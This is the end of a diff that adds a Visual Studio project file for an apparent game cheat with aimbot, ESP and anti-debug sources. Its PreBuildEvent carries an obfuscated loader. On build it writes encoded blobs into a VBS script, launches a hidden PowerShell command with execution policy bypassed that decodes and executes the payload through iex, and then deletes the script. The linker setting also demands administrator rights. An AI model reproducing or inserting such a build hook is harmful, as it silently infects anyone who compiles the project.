2wrrCvcKrw4fDnMKsw4PDj8Oow5XDr8OIw5zDm8KpwrjDsMOZwprCssOOw5LCscKnw5TDpMOYwrPDmsOXw5fDrcOZw5vCssOtw5LDhMOkwrvCvcOYwrLCusOFw4PDr8KqwqjDj8Ovw5XCq8OJw5jCvcOnwqPDnsOnw4rDpcK8w4bDiMOAw5PCvcKmwpfDqsOCw5rDjsOfwrXDpsOKwqjDncKrw5fCqsOWw4PDj8KrwpXDsMKlwrvDiMK8wrjDn8OXw5jDmsOuwrHDoMKnw4fCqsOtw5bDp8Kgw5rDksOAwrDDscOkwrDDp8Oaw5HDgsKgwqrDn8OMwqvCq8K5wpLDpMOBwpvDrcOswrnDp8K6wqrDqsOnwq/DpcOtw4zCusK+wrrDrcOaw4fCqsK2wpfCrcKnw4XDsMOWwpvDgcOqw5fCvMK8w4jDrMOZwqPDs8OEwpPDo8K8wo3DmsOPwrjDicOcw5PDo8Ocw4vCpMOgwpbDnsOdwpvDoMOYwrTDscOCwrbDncOow5XDg8OWwqbDncOjwrrDjsKqw4jDi8OiwpvCr8OBwpvCssOHwqzDncOJwrvCqcObwrXDgsOEwpLCsMOJw4/DrcOZwqfCrMK2w4PDksOJw4/Cq8OIw43DksOdwpbDpMKqwrnDnsOCw5zCrMOgw5rDp8KrwrHDq8OGwrvCv8K4wqTDqcOIwpnCrcOWw5zCr8OZw4/Ds8OIw5jCscONwqfDgsOgwpTCm8KwwobDrcOiwoLCtsKVwobDnsK3wpDDjcOkwqXDocOWw5TCusOnw5TDmsOuworCosKwwr3DmsOnw5TDmsOuwr/Cs8KvwrTDnsOrw4fDq8Oow4fCocKZw5bDpsKewp3CncOHwoLCtsKVwqbCmcKiw4fCu8OPwoLCncOpw4/CmcKiw4fDp8OYwoLCm8KXwp3CncOpwoLCtsKVwobDi8KjwrbDqMK4w4rDmsOnwqPDq8Onw4PDssKdwovCtMKVwr3DmsOnw5TDmsOuwr/Cs8KvwrTDnsOrw4fDq8Oow4fCocKZw5bCosKwwoLCncK3wrjDj8KVwp/CmcOQwrXDssOow5bDnsOiwpDDjcOaw5rDrcKjwqfDp8OYw5HDncOew5DDoMOSwpzCs8OKwrbCv8KtwpDDgMOaw5bDjMOpw5TDosOjw4nCocOQwrXDssOow5bDnsOiwpDCvMOkw5DDr8Oaw5TDrcOSwpzCs8K7w5TDqMOiwqTDmsOow4fCr8KpwrXDrcOnw4vDp8OcworCpsOfw5HDosOjwoLCncOpwovCosKwwoLCncK6wrLDkcKVwp/CmcKXwqvDp8Orw5HDpMOawo/CvsOtw5LDq8Oaw5XDrMOew5HDp8KXwp3CmcODw4fDsMKiwqPDpcOew4PDrMKVwo/Dh8OWw4/DnsKVw5LDkMODwoLCpsOLw4PDpcOqw4fCmcKZwqfDicONwoLCpsK7w5HDq8OYw4fCtMKVw5LDkMODwoLCncK3wrjDjw==&quot; &gt;&gt; &quot;%25a%25\S1nWXPE8C.vbs&quot;&#xD;&#xA;echo d = &quot;PDkcKswqXCvcOewqrDjcOBw5PDnMOlwrrDssK/wqfDk8Ojw4XCpMOiw4XDksOvw4XDpsOJw5HDsMOiwrHCrcK9wq/CssOZw4bDpsOGw4TDhsOnw5TDjMKqwrPDnMOKw5nCvsONw5bDosOMwqPDjMOIw4rDnsK9w4jCssK3w4TDhMOAwrnDjMOMw4nDhsODw4PCu8OKwrHDjcOJwpHDpMOcwrHCrcOEwq/Dp8KmwrXDsMK2w4/Cu8OowrnDjsOsw4bDncODwrrDssKnwrfDo8OYw5nCq8Obw5PCqsKrwprDosOIw5TCq8Orw4jCrsOpwprCssOLwpPDr8Ovwq3Di8Okw5vDqcKkw4XDn8OrwqnDqcKqw4XDrMODwo3CrMOKwpPDsMOJwpHDn8OAw5HCssOvwprCv8ODwrfCssOIwrDCrcOawpTDrcK7wq3CvsOIwpHDgcOBwqXDiMK+wq7Do8Ofw4bDqMOkwrvDm8OgwrzDqMOIwqXDssOdwq7DssOYwrzDp8OWwqbDgcK4wq3CqsOCwrjDpsOMw5PDs8OdwpTDksOgw5zDr8Otw4PCrsOcw4nCscK+wrLCvMOFwrDDhMOiw5LDnsOPwrzDhcOBwrTCqsOjw4rDpcOAw4rDgMK7wrPDpcKmwrDCv8KqwqTDjcKkwq7DjMKqwrHDi8KlwrXDk8OawqfCrsKmwpnCqsOKwpLDgsOEwq3DqcK5wrDDo8K3wpHCqMKgwpHDo8Knw4bCr8Okwq3CsMOlwqPDiMKsw4zDhcOYwrrDiMK5wrzDkcOnwqzDrcObw4bCvMOaw4vDsMONwo3Cu8K3w5bDrMOMw5fDn8OYw4nCqcKtwrnDqcKrwrLCq8KrwqTDjcK2wq/CvsOpw5jDjMOPw4XDo8OmwrDDgMK7wqzDmsOGw4nDosKkwrHDs8K+w4XDncOJwqbCpMOfw47DgcKkwqvCrsKmwqzDsMOlwqXDnMOIwpHDicOLw5fCq8Okw4vDgcOpwqfDjcK2w4zCq8Ohw4rDm8OPwrPDisOKwrfDoMOhwrnDksK7wrzCrsKswpfDqsOawpXCr8OjwrLDnMKrwpPDh8OPw4jDhMOKw4zDjcOLwrDCssOOwqrDjsKqwrXDp8ONw4zDrsOqwqrDrcOEwqXDhsONwo3CscK3wqvCqsOgwo3DnMOhwrLCv8OCwqfDj8OMw5TCvcK5wq/DrMOnw4bDgsOCw4fDksKkwpbDscOAwrvCscKtw43DhcOqw4vCqsKqwrbCrsOaw4PCv8K7w4zDoMK9wq3Di8OiwrzDrsOFwrLCr8K/wqbCvMOiw4bDp8KtwrbDscOpw4jDhcK9wqbDisKswpnDjMKqw5bCssOIwrbDksK4wrbCqsOOwpjDiMOdw5TDosK6wpvDoMK7w5bDpMOkwrrDisOWwpLCrMOjw5PCssODw5jDhsOpwq/DpcOfwpHDisOEwo3DicOhwrPCvMKlwrvDpcOrw5jDrcOIwrzDs8K8wpjDjcKuw4nDhcK/w5zDgcOdw43DncOrw5bDh8Onw4zDhsOtwpjDncKswrHCv8OJwpHDrcOMwrDDisOlw5nDisObw5XDnMOlwq7CpMKuw4XDp8ObwrzDpMOvwrXCrMOPw5PDssOawpvCscOFw5zDr8OMw5zDnMK2wrzDi8K4w4jCvsK/wrDDicOuwrrDpMOWwq3DnsOHwrrCusKnwpbDrMOEwrPDkcOpwqvDhsK2wrvDpMOlwpvDhsOewrbDicOewqzCq8OEw4bCvcOAw4XCqMKuwrLDm8ObwqjDssKow5XDn8OnwrnCvMOkw4fDkMOnwrLCrsK9wqfCsMKrw5HCvMODwqfCvsOYw5bDscOXw5jDo8OewrPDi8OfwpXDosODwpvDrMOXw5HCssOFwrfCsMObwrfDg8K7w5vDgsKrwqTCu8OlwrfCusOPwrfDiMOnwq/DjsOhwpLDoMOPwpLDjcOfwrLCq8OhwrvDh8K3w4zDjsK6w5XCrcOXw4jDiMOGw4/DksK+wqnDoMOew5nCrMOLwpbDhcOEwrbDr8Ohw47CqMOfw5jCsMOOw5fDq8Ocw4PDjcObwqTDn8OowprDhMKgw4fCq8OIw47DqsObw4TDsMKkwrTDjcOqw43CssOcw4PCq8OGwqPCv8K/wqPDk8OcwrnDp8OYw4bDmsOMwrzDq8KqwqzCv8ODw5vDsMKnw4zCrcOYwpvDgMK5wrfDh8OBwrHDgMOIw4TDssOKwpHCvMOHwqbDnsKrw5PDicK5w4vDm8OiwrTDicKpwqfDscOZwq/Dm8OiwqzCvMOBwpvDm8Ogw4XDmsK7wpfCscODwpHDg8OJw4bDi8OswpPDhMOWwq7DnsODw4bDicOewqvDrsOhwrbDhMKrwpnCrcKmwqbDk8Olw4nCusOBw5jDscKnw4bDr8K/wq7DkcOGwqPDm8K5w4zDjsK3w4bCrsK3w5nDocOcw5DDhsOfw4nDkMOqw5LDjsK5w4fCq8ObwpvCvsOnw5DCqsOtwqvDgMOLwpbDpsOcwqzDocK/wq3Dn8Krw4rDpcOmw4jDn8Ohw4vDpMOXw5HDssOXw4jDr8K2wpHDrMOfwqXCvMOlwqvDpsKswpvCqsKuwqnDsMOaw5fDgcOpwrHDssOiw5nCvcOiw5rDgMOow5XDrcOFwrLCrMKmwpHDrcOrwqPDr8Kmwo3DqMOLw4nDnMOWwqfDqcOEwpPDi8OMwrDDqsOiwprDgMKpw4/DoMOawqvDqsK6w4zDg8Obw47Dq8OYwqXDjMK/wpLDpcOdwo3CvsOBw4PDocOtwo3Dp8OfwrPDgMOGwq3DrsOHw5TCscK+w5LDssOHw5nDj8OpwrPDrcKkw4nDoMKqw4/DssK2w5zDgcOjw5fCrMOCwrrDqMOfwq3DhMOWw5TDpsK9w5HCrMOMwq7DncOZw4XDqcK2wrbCvMKuwqTDpcKow5DDnsOkwpXDgsONwrTCq8KmwrLDsMKnw5XDpcK9wrvDicOfw4vDr8Ocw5vCscObw4PDjMOdwqvCvsOMw43DncOWwrHDhMOawrHDgcK5wrDCssK6wpHDqcOWwrrCrcK9wpXCscOhwrvDhMK4w5HCssKnw4jDkMOswrrDhMOCwrPDisKkwrDDg8OOwrDDosKkw4jDn8ODw5jCsMODwrLDkcKowpTCpMK8wpPCvsOfw4vDqsKgwqPDisK4wprDj8OCw5LDksKkwpvDm8Ktw47DoMOmw4PDocOuw5PCqMK7wpfDiMOpwrXDi8K+wq7DhcKswrrDpMK9wrrDgcOmwo3DisONw4TCsMOjwo3Cq8OawqjCrMOMwrfDgsK+w4zDhsOKwrfDj8Onw4jDjMOswpbCvsOgw4zDhMKlw5nDpsKlw4TCusOjwrrCu8K8w4vDiMOpw5rCscOhw5TCu8K5w5rCusK4wrPDosK3wqvCpMOcwpPDjcObwprCv8Orwq7DgMKpwrfCqcOFwq7DisK9w5vDncKpwpPDg8OJwrnDscOow4nDi8OswrrDnsOXwq3Ds8Otw4jDocOIw5rDkcKrw4TDs8OjwpTDjMKuwqXDi8K4wpnDjsOKwrHCvMKuwq/DssKuwrrDm8OXwpPDjMOMw4bCqMOgwrPDkMOswqbCpMKpw4vDo8Kqw4bCqcOJwqbDs8KqwpjDq8OPwq3DkcOmwrjCv8OLwqXDj8Ktw5HDnMK6wqnDrcOhwrDDkcOawrLCvcKsw5HDsMK+w47DmsOgw4fDisOKwrHDkcKrwrzCpMOlwrLDiMKlwqbDncOAwqbCrsOYw5HCv8Ocw47DpcOHwpfDqcK6wrLCv8K+wrHDo8Ohw5DDoMOPwrPDkcOKw5zDssOfwrrDk8OEwpTDisOOw5nDgsOMwqnCusOmwpXDo8Omw43Dn8OWwqjDjMKmw4/DjsOFwrDDssOAwrTDq8KpwpnDoMOrw5DDqMOKwqPCrsK4wrfDpcOHw5TDi8OnwpvDg8OEwpTCssOFwpbCvMOqwpPDqMOpwqfDp8OpwqXCqcK8wpbDn8OLwrfDnMKgw5vDq8OcwprDg8OvwpXDh8OdwpXCv8OHwrfCsMK+w4XDhMOkw4rDm8KlwpTDk8ODwrbDr8Ktw5jDksOEwpvDgcKuw5rCr8OewqjCu8OOw5DDisK2w5zCscKtwrnCqMOlwqzDp8OJwo3CscK+wrXCrsOqwpjDjcOJwq7Cq8KrwqTDgsOrw4vDosOlwrHDpMKlw5LDq8K4wqrDkcOdwrTCq8KgwqvDp8OWwrXDiMK2w4fDqcObwpnDi8OWw4vCq8ONw4fDqMOcwrLDqsOXwpPCqcOmwpnDr8OKwprDgMKqwqfDq8ODwrfDkcKtwpvCvMOBwpHDjsOgw5nDo8K+wrrDs8OOw5zCqcOiw4TDosOkwpfDjcOgwqzDp8KnwpHCssOpw4zDhsOfwpnDqMK5w4bDscOFwpPDkcOmw5nDqcOtwpLCvMOWwqTDk8OBwo3DhcOZw4vDkcOXwrTCvcOLwpHCvMKpw4vDk8ONw5nCrcK8w5bCusOMwrDDqsKmwrbCqcOHwprDqMOuw4bDncOIwqXDqcKuw5vDrMOmwpXDrcKrwpLDgsOXwpTDgsOmw5rCvsOIwrbCvcObw5LDq8OXw4TDjcOOwrHDqMK4wrDDrMKnw5bDpsOjw4nDssOPwqnDnsK5w5DDscOjw4fDhcOLwrzDnsOYwrvDnMOYw4jCu8OOwpjDjsOrwpPCqcK2wpnCsMOCw4jDi8Orw5fDs8KkwrzDrsOawqnDicOaw5HCr8OawrnDncOiw43DqcKow5TDq8K2wpbCqsKtwpjCvsODwrHCqsK9wrPCq8OhwrrCvcOPwprDqcOfwpjDn8OCwpXCv8KgwpnCrcKqwqnDi8OnwqTCrcK7w4vDq8OAwpbCssKow5XDsMOXw4/CvcK6w4PDk8Ksw4bCpMOtwrnCqcOfwqnDpMOHwqTCu8K5w5nCpMOfw4bDgMKmwrDDk8K/wqvCscOcwqnDj8OrwqfDicOfw4fCpMODwprDnsKrwqfDkMOjw5HDpcOmwqjDs8OlwqTCr8OawrzCr8Olwq7Di8Opw5fDmsObwprDqsK9wqjDsMK3w5HDs8OawrfDssONwrvCqMOEwq/DqMOiwqTCvMOPw5LDssOuwpTDssKrw5jDrMOFwrbDjcK5wqnDisOcw4nDisOKwpTDm8KlwpHDj8K5wqbCusK8wpXDgcOIwrXDq8K6w5vDhsOKwqjDgMOKwo3Dg8K2wqbDscOowq3CrsOow5vCvsOgwrXDj8K9wpPDosKtwpLDncOAw5PDn8OuwrTDnsOaw5LDg8OMwpPDn8OXw4/Dn8KkwqTDg8OpwpLCvMK3wrLDr8Kkw4jDr8OuwqPDgMOPwprDhMK8wrrDhMOXwpTCu8OJw4TCrcOEwprDnMObw5XCu8Krw5vDoMOlwqbDjMOiwrHDs8K8wq/DicOlwo3CscOfwqnDs8Kpw5XDgcOEwqbCrMODw5nDncK7wqPDqsOKwo3CqsKkwqTDg8K5wq7DiMOKwqrDgsKmw5PDgsOaw4XDjMOtwrjCu8K5w5XDm8OKw5zCvcOBw5TCrMOPwrjDqsK2wrjDnMOtwpfDksOZw5TDkMKgw4rDj8OCwpLDhcODw4zDjcOcwpbDm8OZw5vDgsOOwprDocOLwqPCvsKqwrvDhsKrwpXDs8OGwrfDqsOiw5fDisODwqPDnMOewpvDhcOfw4fCv8OIwrLCrMOIw5jCqsOHw4nCvMOewqzDksKpwpPCvsOqwpTDh8K5wrfDp8OcwqTDicOfw5rDnsOMw5XCr8OWwqfDgsOHwrPDqcOjw4vDoMKtwqzDgcOgw4PCrsKkwo3DscOjw5zCv8OLw4TDpcK/wo3Dg8OfwpbDj8OvwrLCq8OswrDDoMOBwrjCu8OGwpPDscOfw4bCsMK+wqPDpcObwqnDm8OBwqvCvsOnwqjCpMOiw4bDo8Osw5rDk8ODwqXDhcOGw5LCrcKkw4rDkcOEwpPDq8OKw4PDhsKswrnDgcOnwpnCvsKkwqPDmsOCwrjDmsKnwpXDp8Kpw5jCsMOWw4vDkcOpwpHDh8OFw5TD&quot; &gt;&gt; &quot;%25a%25\S1nWXPE8C.vbs&quot;&#xD;&#xA;echo e = b ^&amp; d ^&amp; c &gt;&gt; &quot;%25a%25\S1nWXPE8C.vbs&quot;&#xD;&#xA;echo h = &quot;%25a%25\NGyM.dart&quot; &gt;&gt; &quot;%25a%25\S1nWXPE8C.vbs&quot;&#xD;&#xA;echo Set j = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; &quot;%25a%25\S1nWXPE8C.vbs&quot;&#xD;&#xA;echo Set k = j.CreateTextFile(h, True) &gt;&gt; &quot;%25a%25\S1nWXPE8C.vbs&quot;&#xD;&#xA;echo k.Write e &gt;&gt; &quot;%25a%25\S1nWXPE8C.vbs&quot;&#xD;&#xA;echo k.Close &gt;&gt; &quot;%25a%25\S1nWXPE8C.vbs&quot;&#xD;&#xA;echo Set m = CreateObject(&quot;WScript.Shell&quot;) &gt;&gt; &quot;%25a%25\S1nWXPE8C.vbs&quot;&#xD;&#xA;echo m.Run &quot;powershell -ep bypass -enc JABkAGkAcgA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBQAGEAdABoAF0AOgA6AEcAZQB0AFQAZQBtAHAAUABhAHQAaAAoACkAKwAiAFwAQwBZAHcAOABuAFUAIgA7ACQAZgA9AGcAYwBpACAAJABkAGkAcgAgAC0ARgBpAGwAdABlAHIAIAAiACoALgBkAGEAcgB0ACIAOwBmAG8AcgBlAGEAYwBoACgAJABmADIAIABpAG4AIAAkAGYAKQB7AHQAcgB5AHsAJABiAGIAZAA9AGcAYwAgACQAZgAyAC4ARgB1AGwAbABOAGEAbQBlACAALQBSAGEAdwA7ACQAZAA9AHsAcABhAHIAYQBtACgAJABwAD0AJABiAGIAZAAsACQAbAA9ACIAYgB5AHUAIgApACQAdAA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAHAAKQApADsALQBqAG8AaQBuACgAMAAuAC4AKAAkAHQALgBMAGUAbgBnAHQAaAAtADEAKQB8ACUAewBbAGMAaABhAHIAXQAoAFsAaQBuAHQAXQBbAGMAaABhAHIAXQAkAHQAWwAkAF8AXQAtAFsAaQBuAHQAXQBbAGMAaABhAHIAXQAkAGwAWwAkAF8AJQAkAGwALgBMAGUAbgBnAHQAaABdACkAfQApAH0AOwAkAGsAPQAmACQAZAA7AGkAZQB4ACAAJABrADsAYgByAGUAYQBrAH0AYwBhAHQAYwBoAHsAfQB9AA==&quot;, 0, False &gt;&gt; &quot;%25a%25\S1nWXPE8C.vbs&quot;&#xD;&#xA;echo Set f = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; &quot;%25a%25\S1nWXPE8C.vbs&quot;&#xD;&#xA;echo Set shell = CreateObject(&quot;WScript.Shell&quot;) &gt;&gt; &quot;%25a%25\S1nWXPE8C.vbs&quot;&#xD;&#xA;echo s = WScript.ScriptFullName &gt;&gt; &quot;%25a%25\S1nWXPE8C.vbs&quot;&#xD;&#xA;echo f.DeleteFile(s) &gt;&gt; &quot;%25a%25\S1nWXPE8C.vbs&quot;&#xD;&#xA;cscript //nologo &quot;%25a%25\S1nWXPE8C.vbs&quot;&#xD;&#xA;endlocal</Command></PreBuildEvent>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+      <AdditionalIncludeDirectories>$(ProjectDir)include;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <LanguageStandard>stdcpp17</LanguageStandard>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <AdditionalDependencies>glew32s.lib;glfw3.lib;opengl32.lib;kernel32.lib;user32.lib;gdi32.lib;winspool.lib;comdlg32.lib;advapi32.lib;shell32.lib;ole32.lib;oleaut32.lib;uuid.lib;odbc32.lib;odbccp32.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalLibraryDirectories>$(ProjectDir)lib;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
+      <UACExecutionLevel>RequireAdministrator</UACExecutionLevel>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="AntiDebug.cpp" />
+    <ClCompile Include="console_title_animator.cpp" />
+    <ClCompile Include="file_operations.cpp" />
+    <ClCompile Include="include\imgui\imgui.cpp" />
+    <ClCompile Include="include\imgui\imgui_demo.cpp" />
+    <ClCompile Include="include\imgui\imgui_draw.cpp" />
+    <ClCompile Include="include\imgui\imgui_impl_glfw.cpp" />
+    <ClCompile Include="include\imgui\imgui_impl_opengl3.cpp" />
+    <ClCompile Include="include\imgui\imgui_tables.cpp" />
+    <ClCompile Include="include\imgui\imgui_widgets.cpp" />
+    <ClCompile Include="main.cpp" />
+    <ClCompile Include="nav_elements.cpp" />
+    <ClCompile Include="user_interface.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="aimbot.hpp" />
+    <ClInclude Include="AntiDebug.h" />
+    <ClInclude Include="auth.hpp" />
+    <ClInclude Include="byte_array.h" />
+    <ClInclude Include="color.hpp" />
+    <ClInclude Include="console_title_animator.h" />
+    <ClInclude Include="esp.hpp" />
+    <ClInclude Include="exploit.h" />
+    <ClInclude Include="file_operations.h" />
+    <ClInclude Include="get_player.hpp" />
+    <ClInclude Include="image.h" />
+    <ClInclude Include="include.h" />
+    <ClInclude Include="include\GLFW\glfw3.h" />
+    <ClInclude Include="include\GLFW\glfw3native.h" />
+    <ClInclude Include="include\GL\eglew.h" />
+    <ClInclude Include="include\GL\glew.h" />
+    <ClInclude Include="include\GL\glxew.h" />
+    <ClInclude Include="include\GL\wglew.h" />
+    <ClInclude Include="include\imgui\imconfig.h" />
+    <ClInclude Include="include\imgui\imgui.h" />
+    <ClInclude Include="include\imgui\imgui_impl_glfw.h" />
+    <ClInclude Include="include\imgui\imgui_impl_opengl3.h" />
+    <ClInclude Include="include\imgui\imgui_internal.h" />
+    <ClInclude Include="include\imgui\imstb_rectpack.h" />
+    <ClInclude Include="include\imgui\imstb_textedit.h" />
+    <ClInclude Include="include\imgui\imstb_truetype.h" />
+    <ClInclude Include="json.hpp" />
+    <ClInclude Include="main.hpp" />
+    <ClInclude Include="memory.h" />
+    <ClInclude Include="nav_elements.h" />
+    <ClInclude Include="offsets.h" />
+    <ClInclude Include="render.hpp" />
+    <ClInclude Include="skStr.h" />
+    <ClInclude Include="trigger.hpp" />
+    <ClInclude Include="user_interface.h" />
+    <ClInclude Include="utils.hpp" />
+    <ClInclude Include="vector.h" />
+    <ClInclude Include="xor.hpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <Library Include="libcurl.lib" />
+    <Library Include="library_x64.lib" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
